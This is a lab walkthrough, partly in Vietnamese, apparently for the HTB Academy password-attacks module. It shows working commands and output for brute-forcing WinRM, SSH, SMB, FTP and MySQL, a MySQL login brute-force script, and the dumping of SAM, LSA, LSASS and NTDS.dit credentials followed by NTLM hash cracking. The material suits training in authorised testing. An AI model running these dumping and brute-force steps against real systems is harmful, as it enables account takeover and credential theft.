# Network Services
+ 0  Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```zsh
❯ crackmapexec winrm 10.129.105.153 -u username.list
```

`john:november`

![](images/1.png)

![](images/2.png)

+ 0  Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
![](images/3.png)

`dennis:rockstar`

+ 0  Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

```powershell
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

dennis@WINSRV C:\Users\dennis>cd Desktop 

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{Let5R0ck1t}                        
dennis@WINSRV C:\Users\dennis\Desktop> 
```

+ 0  Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

![](images/4.png)

`john:november`

Trông có vẻ dễ ăn cho tới khi không vào được (permission denied), chuyển hướng sang enum cả list với metasploit:

```zsh
msf6 auxiliary(scanner/smb/smb_login) > set user_file /home/kali/Desktop/learning/password_attack/username.list
user_file => /home/kali/Desktop/learning/password_attack/username.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file /home/kali/Desktop/learning/password_attack/password.list
pass_file => /home/kali/Desktop/learning/password_attack/password.list
msf6 auxiliary(scanner/smb/smb_login) > run
```


```zsh
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\john:november'
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\dennis:rockstar'
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\chris:789456123'
[+] 10.129.105.153:445    - 10.129.105.153:445 - Success: '.\cassie:12345678910'
```

Check `shares` thì có `CASSIE` -> Ưu tiên cassie:12345678910

![](images/5.png)

# Password Mutations

+   Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.

```zsh
❯ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
❯ cat mut_password.list | wc -l
94044

```

Tips: Brute force các dịch vụ khác như smb hoặc ftp cho ra kết quả nhanh hơn.

```zsh
❯ hydra -l sam -P mut_password.list ftp://10.129.17.11 -I -t 50 -v
[STATUS] 740.40 tries/min, 11106 tries in 00:15h, 82938 to do in 01:53h, 50 active
[21][ftp] host: 10.129.17.11   login: sam   password: B@tm@n2022!
[STATUS] attack finished for 10.129.17.11 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

```zsh
sam@nix01:~$ cd smb
sam@nix01:~/smb$ ls -la
total 12
drwx------  2 sam samba 4096 Feb  9  2022 .
drwxr-xr-x 14 sam sam   4096 Feb  9  2022 ..
-rw-rw-r--  1 sam sam     20 Feb  9  2022 flag.txt
sam@nix01:~/smb$ cat flag.txt 
HTB{P455_Mu7ations}
sam@nix01:~/smb$ 
```

# Password Reuse / Default Passwords

+ 0  Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: \<username>:\<password>)

Đầu tiên forward mysql về VM:

```zsh
❯ ssh -L 33060:localhost:33060 sam@10.129.17.11
```

Với dạng này thì nên dùng options `hydra -C`

Search Google có của Seclists tuy nhiên không ăn thua,
![](images/6.png)

Trong bài đề cập đến tool [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

```zsh
❯ creds search mysql --export
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql (ssh)         |        root       |   root   |
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+

[+] Creds saved to /tmp/mysql-usernames.txt , /tmp/mysql-passwords.txt 📥
```

```zsh
❯ paste -d ':' /tmp/mysql-usernames.txt /tmp/mysql-passwords.txt > mysql-creds.txt
❯ hydra -C mysql-creds.txt mysql://localhost:33060
```

Vẫn có vẻ không ổn, thôi đành test bằng tay thôi...
Gặp lỗi này: ERROR 2002 (HY000): Can't connect to local server through socket '/run/mysqld/mysqld.sock' (2)
```zsh
sudo systemctl start mysqld     # or mysql on some distros :contentReference[oaicite:1]{index=1}  
sudo systemctl enable mysqld  
sudo systemctl status mysqld    # should show “active (running)” :contentReference[oaicite:2]{index=2}  
```

```zsh
❯ mysql -h 127.0.0.1 -P 33060 -usuperdba -padmin ERROR 5010 (HY000): Authentication plugin 'mysql_old_password' couldn't be found in restricted_auth plugin list.
```
### **Nguyên nhân:**

- Máy chủ MySQL đích đang sử dụng plugin xác thực lỗi thời `mysql_old_password` (đã bị deprecated từ MySQL 4.1).
    
- Client MySQL trên máy local của bạn (phiên bản mới) đã loại bỏ hỗ trợ cho plugin này do lỗ hổng bảo mật.

Cho nên ta cần chạy `script` sau trên máy nạn nhân:

```bash
#!/usr/bin/bash

USER_FILE="mysql-usernames.txt"
PASS_FILE="mysql-passwords.txt"

mapfile -t USERS < "$USER_FILE"
mapfile -t PASSES < "$PASS_FILE"

OUT="mysql-checked.txt"
> "$OUT"

for user in "${USERS[@]}"; do
  for pass in "${PASSES[@]}"; do
    # Thử connect, với --connect-timeout để tránh treo lâu
    if mysql --host=localhost --port=33060 \
             --user="$user" --password="$pass" \
             --connect-timeout=5 \
             -e "SELECT 1" &>/dev/null; then
      echo "[OK] $user:$pass" >> "$OUT"
    else
      echo "[FAIL] $user:$pass" >> "$OUT"
    fi
  done
done

echo "Hoàn tất! Kết quả lưu ở: $OUT"
```

Và sau đó:
```zsh
sam@nix01:~$ ./test.sh 
Hoàn tất! Kết quả lưu ở: mysql-checked.txt
sam@nix01:~$ cat mysql-checked.txt 
[FAIL] admin@example.com:
[FAIL] admin@example.com:root
[FAIL] admin@example.com:admin
[FAIL] scrutremote:
[FAIL] scrutremote:root
[FAIL] scrutremote:admin
[FAIL] superdba:
[FAIL] superdba:root
[OK] superdba:admin
[FAIL] root:
[FAIL] root:root
[FAIL] root:admin
sam@nix01:~$ 
```
# Attacking SAM

+ 0  Where is the SAM database located in the Windows registry? (Format: ****\***)

> **hklm/sam**

 RDP to 10.129.202.137 (ACADEMY-PWATTACKS-WIN10SAM) with user "Bob" and password "HTB_@cademy_stdnt!"

+ 1  Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

![](images/7.png)

Tiến hành dump:

```zsh
❯ ls
sam.save  security.save  system.save

❯ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 
```

Xử lý gọn gàng:
```zsh
awk -F: '{ print $1 ":" $4 }' SAM.txt > ntlm_hashes.txt
❯ hashcat -m 1000 it-backdoor.txt /usr/share/wordlists/rockyou.txt --user --show
ITbackdoor:c02478537b9727d391bc80011c2e2321:matrix
```



 RDP to 10.129.202.137 (ACADEMY-PWATTACKS-WIN10SAM) with user "Bob" and password "HTB_@cademy_stdnt!"

+ 1  Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

```zsh
❯ crackmapexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.202.137  445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/kali/.cme/logs/FRONTDESK01_10.129.202.137_2025-04-23_102902.secrets and /home/kali/.cme/logs/FRONTDESK01_10.129.202.137_2025-04-23_102902.cached
```

**Cách 2:**

```zsh
❯ crackmapexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping SAM hashes
SMB         10.129.202.137  445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.137  445    FRONTDESK01      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.137  445    FRONTDESK01      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.202.137  445    FRONTDESK01      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.202.137  445    FRONTDESK01      bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
SMB         10.129.202.137  445    FRONTDESK01      jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.202.137  445    FRONTDESK01      ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.202.137  445    FRONTDESK01      [+] Added 8 SAM hashes to the database
```

```zsh
❯ echo 'frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::' | awk -F: '{ print $1 ":" $4 }' > frontdesk.txt

❯ cat frontdesk.txt
frontdesk:58a478135a93ac3bf058a5ea0e8fdb71

❯ hashcat -m 1000 frontdesk.txt /usr/share/wordlists/rockyou.txt --user --show
frontdesk:58a478135a93ac3bf058a5ea0e8fdb71:Password123
```

# Attacking LSASS

+ 0  What is the name of the executable file associated with the Local Security Authority Process?
> lsass.exe

 RDP to 10.129.174.59 (ACADEMY-PWATTACKS-LSASS) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 1  Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

#### **Tiến hành dump**
Cách 1:

![](images/8.png)

Cách 2:

![](images/9.png)

## Extract Credentials

#### Running Pypykatz
```zsh
❯ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 1400434 (155e72)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2025-04-23T14:52:43.749603+00:00
sid S-1-5-90-0-2
luid 1400434
        == WDIGEST [155e72]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [155e72]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 1396637 (154f9d)
session_id 0
username htb-student
domainname FS01
logon_server FS01
logon_time 2025-04-23T14:52:40.358986+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 1396637

== LogonSession ==
authentication_id 73485 (11f0d)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2025-04-23T14:39:41.270604+00:00
sid S-1-5-90-0-1
luid 73485
        == WDIGEST [11f0d]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [11f0d]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 42217 (a4e9)
session_id 0
username 
domainname 
logon_server 
logon_time 2025-04-23T14:39:39.364348+00:00
sid None
luid 42217

== LogonSession ==
authentication_id 44086 (ac36)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2025-04-23T14:39:40.317493+00:00
sid S-1-5-96-0-1
luid 44086
        == WDIGEST [ac36]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [ac36]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 43293 (a91d)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2025-04-23T14:39:40.208100+00:00
sid S-1-5-96-0-0
luid 43293
        == WDIGEST [a91d]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [a91d]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2025-04-23T14:39:39.161216+00:00
sid S-1-5-18
luid 999
        == WDIGEST [3e7]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == Kerberos ==
                Username: fs01$
                Domain: WORKGROUP
        == WDIGEST [3e7]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == DPAPI [3e7]==
                luid 999
                key_guid 7a4c5806-cde2-4e33-bb8e-a7988d928856
                masterkey 3036713f3ccfde362f57050b050289413347b9063264743b01c65e4143c6806512ece05c708b934afe48cd5b8cfe88de125d6208bbe048bd3fb83838adf2946e
                sha1_masterkey 6c3046d0bc927cdfd9b4503c6115034018dbddd1
        == DPAPI [3e7]==
                luid 999
                key_guid e9cc30c4-53bb-487b-8bc5-e2bb17623a06
                masterkey cd9d19f576262373c8dbffb9d21736b7746b165acbfbc92a823a5e329dc42c5d6dedba53d1a5964bfe84fa5d387b8bc5e0f9e2e7586264853b818284637e5726
                sha1_masterkey 3478c36725f217ad5fd4bee7680f815af0828193
        == DPAPI [3e7]==
                luid 999
                key_guid 0c1b6c0a-191d-4839-8cf5-22ca4c3e5880
                masterkey dccd4056a5b0cc8211193669e6aea7755eeccd393adf0e5efa1f2a571c96039a7dbe05c9082c44f85b3080bb908eb41fb9f860174cd365e655f3d5788d5a8427
                sha1_masterkey efddd94b4348303e90c8d7285e8b65738196dc86
        == DPAPI [3e7]==
                luid 999
                key_guid 0453985c-7220-49f4-b024-79acf0de7874
                masterkey aaf3cdd36cf0d10871efd0d78a527664afc58078e84d49734f372fbb09e209538f606e0c5f0481b9f4d6ac6efb9a3631f16e38737a1b3cc15d0db42b63ebc90e
                sha1_masterkey 1d77f450edb6c76d14838b5b351672f35eec615f
        == DPAPI [3e7]==
                luid 999
                key_guid c19ecbf1-ea92-487e-a2d4-419f60a62360
                masterkey 387a060baf6887038b7ff133cd0eb4712ecdf531c16030a82395db368e6b2cda563dd026ccb815e1fb85215281a5437f085e3a5ca47fe9038e7e072f46270d74
                sha1_masterkey 5b07ca8e21e100937af4ab6d3f2482c745245436
        == DPAPI [3e7]==
                luid 999
                key_guid 6c61536b-7453-4ffa-911b-693858aef0c9
                masterkey 0c5f662bf8f65c75b773e4698606db1e2e387ad18a9c4fdee25e0dbac6eb7c04e04874d1910aba465ef3380a92b46231d7a781df2f5e38d2621e06c7476b222f
                sha1_masterkey cbabadd23d93b47ec94ac604ac91945135c5a097

== LogonSession ==
authentication_id 1421259 (15afcb)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2025-04-23T14:52:44.515231+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 1421259
        == MSV ==
                Username: htb-student
                Domain: FS01
                LM: NA
                NT: 3c0e5d303ec84884ad5c3b7876a06ea6
                SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [15afcb]==
                username htb-student
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: htb-student
                Domain: FS01
        == WDIGEST [15afcb]==
                username htb-student
                domainname FS01
                password None
                password (hex)

== LogonSession ==
authentication_id 1399081 (155929)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2025-04-23T14:52:43.733971+00:00
sid S-1-5-96-0-2
luid 1399081
        == WDIGEST [155929]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [155929]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 129497 (1f9d9)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2025-04-23T14:39:44.598701+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 129497
        == MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [1f9d9]==
                username Vendor
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: Vendor
                Domain: FS01
        == WDIGEST [1f9d9]==
                username Vendor
                domainname FS01
                password None
                password (hex)

== LogonSession ==
authentication_id 73503 (11f1f)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2025-04-23T14:39:41.270604+00:00
sid S-1-5-90-0-1
luid 73503
        == WDIGEST [11f1f]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [11f1f]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username FS01$
domainname WORKGROUP
logon_server 
logon_time 2025-04-23T14:39:40.598759+00:00
sid S-1-5-20
luid 996
        == WDIGEST [3e4]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == Kerberos ==
                Username: fs01$
                Domain: WORKGROUP
        == WDIGEST [3e4]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 1421288 (15afe8)
session_id 2
username htb-student
domainname FS01
logon_server FS01
logon_time 2025-04-23T14:52:44.515231+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1006
luid 1421288
        == MSV ==
                Username: htb-student
                Domain: FS01
                LM: NA
                NT: 3c0e5d303ec84884ad5c3b7876a06ea6
                SHA1: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [15afe8]==
                username htb-student
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: htb-student
                Domain: FS01
        == WDIGEST [15afe8]==
                username htb-student
                domainname FS01
                password None
                password (hex)
        == DPAPI [15afe8]==
                luid 1421288
                key_guid c75b5a96-7d80-4511-8bb8-474e3c09670f
                masterkey 12e8cc72d4d672d492fc8878c736aea970e11d74e87061fe779ce8884c9f0cb20cd0db541f95440ed8c4d527a91682fb7721ba397700932a49c8dbb7120cd2c8
                sha1_masterkey a34f57ba87672c43f091934906052ac4cf7364f7

== LogonSession ==
authentication_id 1400461 (155e8d)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2025-04-23T14:52:43.749603+00:00
sid S-1-5-90-0-2
luid 1400461
        == WDIGEST [155e8d]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)
        == WDIGEST [155e8d]==
                username FS01$
                domainname WORKGROUP
                password None
                password (hex)

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2025-04-23T14:39:41.551826+00:00
sid S-1-5-19
luid 997
        == Kerberos ==
                Username: 
                Domain: 
```

```zsh
❯ hashcat -m 1000 '31f87811133bc6aaa75a536e77f64314' /usr/share/wordlists/rockyou.txt --show
31f87811133bc6aaa75a536e77f64314:Mic@123
```

# Attacking Active Directory & NTDS.dit

+ 0  What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)
> NTDS.dit

+ 0  Submit the NT hash associated with the Administrator user from the example output in the section reading.
> 64f12cddaa88057e06a81b54e73b949b


+ 1  On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

**HINT:**
![](images/10.png)

```zsh
❯ cat full-names.txt
John Marston
Carol Johnson
Jennifer Stapleton

❯ ./username-anarchy --input-file ./full-names.txt --select-format flast
jmarston
cjohnson
jstapleton
```

![](images/11.png)

Không thể dùng xfreerdp3, vậy ta thử win-rm:
```powershell
❯ evil-winrm -i 10.129.247.33 -u jmarston -p 'P@ssword!'
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jmarston\Documents> 

```

User này có quyền admin:
![](images/12.png)

Tiến hành lấy NTDS.dit:
![](images/13.png)

#### **DUMPING CREDS**

Cách 1: Lấy cả system (hoặc cả security nếu cần) trong hives và dùng secretdump tương tự dump SAM hay LSASS:

```zsh
❯ impacket-secretsdump -ntds NTDS.dit -system system.save -security security.save LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:7b1c5a9fa8d096673b0b7c38e0e780c48ed6aafc9ba88a3f573ace3585243d2229739c6f09fb5813a0dd10f70eef496503add381650fc17447147447a76c9b3df7943c1fc2cbc24ea52baebe919575c36db6e4661da83856293b01c506c056b8120db64bc6f8ff435fda712780e3668fbc9e0d1f3590085c7222609469c2808bd688130589ca932449503a766a0517ebc13c8fd132ca4b8f298edcebbf095c4ad58e6ef858922edc17ac00a78cca38bbfff8843fe3a5bdd3bfb3afdbd7946080904cc2c24f8464176f5596893c1d73a01449307267f460adf8d79ba94425bcc4f4ba3cfb1b85a367f7ce53b9d497e9c9
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3fd7bdb040a6a1b291df4505494a2888
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x91605a6ced1362b191874d151b7e183e8273c60b
dpapi_userkey:0xfddc0156308f24b7eb480878ff9eb60caa820661
[*] NL$KM 
 0000   5F 03 DB 6A FD 54 3D 01  47 59 09 C8 F7 91 CE 72   _..j.T=.GY.....r
 0010   F6 28 B7 AD 55 B4 5E A6  9E 9D 7E 3A DE 1E A0 BF   .(..U.^...~:....
 0020   93 FB 4C E5 4D 8E AB 2C  0B 44 7F 3A F1 58 4C 1A   ..L.M..,.D.:.XL.
 0030   29 52 89 14 23 5E C0 A6  FE 2B FC F2 0F CB 13 11   )R..#^...+......
NL$KM:5f03db6afd543d01475909c8f791ce72f628b7ad55b45ea69e9d7e3ade1ea0bf93fb4ce54d8eab2c0b447f3af1584c1a29528914235ec0a6fe2bfcf20fcb1311
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8af61f67a96ac6fb352f192b1cfc6b56:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
[*] Kerberos keys from NTDS.dit 
Administrator:aes256-cts-hmac-sha1-96:a2bfeccd55aca0e53f893d1ae43abcdf0d6aa5793cd5d2dbe8c6f577cbbe5a35
Administrator:aes128-cts-hmac-sha1-96:84a147160d42613b0ffe0bd060dbca9c
Administrator:des-cbc-md5:3ec8540110d3e058
ILF-DC01$:aes256-cts-hmac-sha1-96:50d1401419bf8fe68aa149e67f327af59fc923653e3ebe212345883a3b92bb2d
ILF-DC01$:aes128-cts-hmac-sha1-96:f16761d510325e2640b31a9ef9e5350a
ILF-DC01$:des-cbc-md5:f20b1ae0e0f2986b
krbtgt:aes256-cts-hmac-sha1-96:4c3efde4c6ef4005e67a3d9aa09d91d9325518443e54a914f83839a2ed7d02ec
krbtgt:aes128-cts-hmac-sha1-96:69ef62ae6a467bca3e3aa07495b81a64
krbtgt:des-cbc-md5:6e1fa8f219daa82c
ILF.local\jmarston:aes256-cts-hmac-sha1-96:9e7d0ec693ff443437aae379ee87d07ed42d6745a4eab784eaa54ceff2fa2649
ILF.local\jmarston:aes128-cts-hmac-sha1-96:b106cf089340b2e610710d6a89ea890d
ILF.local\jmarston:des-cbc-md5:5e5dc24ff73ee9a8
ILF.local\cjohnson:aes256-cts-hmac-sha1-96:2d332798b58ed1a9611e2ecabb338aec01fab4519b08ce4986ebc405c851d7fc
ILF.local\cjohnson:aes128-cts-hmac-sha1-96:cf66ade75cbc1c17d55d6abae64a77f3
ILF.local\cjohnson:des-cbc-md5:83f8cbe3386d858a
ILF.local\jstapleton:aes256-cts-hmac-sha1-96:bf06c080a3e7975799a9f58b606fef8a4b2c4f574cb9e7e99c0686971850ca64
ILF.local\jstapleton:aes128-cts-hmac-sha1-96:828fbbc322f3929f1fe164bcae50e310
ILF.local\jstapleton:des-cbc-md5:d057ad893d8a6b2f
ILF.local\gwaffle:aes256-cts-hmac-sha1-96:b3a7e81c743c8457ba643a5c63058af6f8d21f2a71c793ff7058e73f82ff45a0
ILF.local\gwaffle:aes128-cts-hmac-sha1-96:76943b80314d6f172ed66bb7a4ed72ad
ILF.local\gwaffle:des-cbc-md5:8668a2d073764a3e
LAPTOP01$:aes256-cts-hmac-sha1-96:e0b95703b96705adaf6b5ddadb1f9896729e75683e99f55a6c7bf31e32c3a6d0
LAPTOP01$:aes128-cts-hmac-sha1-96:f42fef661ee76d7e5d2062443e569d5d
LAPTOP01$:des-cbc-md5:26ade5ce709bb5e5
[*] Cleaning up... 

```

Cách 2: Dump remote bằng cme:

![](images/15.png)


+ 1  Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

Trích xuất dump ta có:

```zsh
❯ echo 'jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::' | cut -d ':' -f1,4
jstapleton:92fd67fd2f49d0e83744aa82363f021b

❯ hashcat -m 1000 '92fd67fd2f49d0e83744aa82363f021b' /usr/share/wordlists/rockyou.txt --show
92fd67fd2f49d0e83744aa82363f021b:Winter2008
```

